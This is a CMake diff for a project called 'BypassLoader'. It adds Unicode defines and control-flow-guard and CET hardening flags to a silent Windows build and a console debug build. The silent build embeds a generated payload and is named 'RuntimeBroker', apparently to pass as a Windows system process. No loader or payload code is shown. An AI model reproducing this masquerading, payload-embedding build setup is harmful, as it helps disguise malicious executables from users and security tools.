@@ -45,7 +45,7 @@ add_executable(BypassLoader WIN32 ${LOADER_SRC})
 
 target_include_directories(BypassLoader PRIVATE ${LOADER_INC})
 target_link_libraries(BypassLoader PRIVATE ${LOADER_LIBS})
-target_compile_definitions(BypassLoader PRIVATE BP_SILENT=1)
+target_compile_definitions(BypassLoader PRIVATE BP_SILENT=1 UNICODE _UNICODE)
 set_static_crt(BypassLoader)
 if(TARGET generate_embedded_payload)
     add_dependencies(BypassLoader generate_embedded_payload)
@@ -55,7 +55,8 @@ set_target_properties(BypassLoader PROPERTIES
     OUTPUT_NAME   "RuntimeBroker"
     RUNTIME_OUTPUT_DIRECTORY "${CMAKE_SOURCE_DIR}/bin"
 )
-target_link_options(BypassLoader PRIVATE /SUBSYSTEM:WINDOWS)
+target_compile_options(BypassLoader PRIVATE /guard:cf)
+target_link_options(BypassLoader PRIVATE /SUBSYSTEM:WINDOWS /guard:cf /CETCOMPAT /DYNAMICBASE /OPT:NOICF)
 
 # ── Target 2: BypassLoaderDbg (debug, console, SUBSYSTEM:CONSOLE) ──────────
 # --txf flag supported. Full wprintf output. getchar() pause on exit.
@@ -63,7 +64,7 @@ add_executable(BypassLoaderDbg ${LOADER_SRC})
 
 target_include_directories(BypassLoaderDbg PRIVATE ${LOADER_INC})
 target_link_libraries(BypassLoaderDbg PRIVATE ${LOADER_LIBS})
-target_compile_definitions(BypassLoaderDbg PRIVATE BP_SILENT=0)
+target_compile_definitions(BypassLoaderDbg PRIVATE BP_SILENT=0 UNICODE _UNICODE)
 set_static_crt(BypassLoaderDbg)
 if(TARGET generate_embedded_payload)
     add_dependencies(BypassLoaderDbg generate_embedded_payload)
@@ -73,4 +74,5 @@ set_target_properties(BypassLoaderDbg PROPERTIES
     OUTPUT_NAME   "BypassLoaderDbg"
     RUNTIME_OUTPUT_DIRECTORY "${CMAKE_SOURCE_DIR}/bin"
 )
-target_link_options(BypassLoaderDbg PRIVATE /SUBSYSTEM:CONSOLE)
+target_compile_options(BypassLoaderDbg PRIVATE /guard:cf)
+target_link_options(BypassLoaderDbg PRIVATE /SUBSYSTEM:CONSOLE /guard:cf /CETCOMPAT /DYNAMICBASE /OPT:NOICF)
